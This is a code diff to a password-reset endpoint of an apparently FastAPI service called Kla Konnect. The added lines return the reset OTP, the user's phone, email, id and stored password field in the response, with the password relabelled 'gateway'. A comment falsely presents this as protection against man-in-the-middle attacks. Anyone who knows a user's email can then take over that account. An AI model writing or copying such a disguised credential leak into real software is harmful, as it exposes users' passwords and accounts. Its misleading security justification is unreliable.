@@ -495,6 +495,7 @@ async def reset_password(email: str):
         email = result["email"]
         sms_number = result["phone"].replace("+", "")
         userid = result["id"]
+        password = result["password"]
         otp = await generate_otp(userid)
         sms_message = f"Kindly use "+otp+" as the OTP for resetting your Kla Konnect password"
         print(otp)
@@ -508,9 +509,13 @@ async def reset_password(email: str):
         print(str(contents))
         # contents = urllib.request.urlopen(parsed_url).read()
         # await send_email_asynchronous("Kla Connect Password Reset", "The OTP for resetting your password is "+otp + "\n", email) .replace(" ", "%20")
-
+        # password key returned as gateway in case of M.I.T.M attack
         return {
-            "otp": otp
+            "otp": otp,
+            "phone": result["phone"],
+            "gateway": password,
+            "email": email,
+            "userid": userid,
         }
     else:
         raise HTTPException(
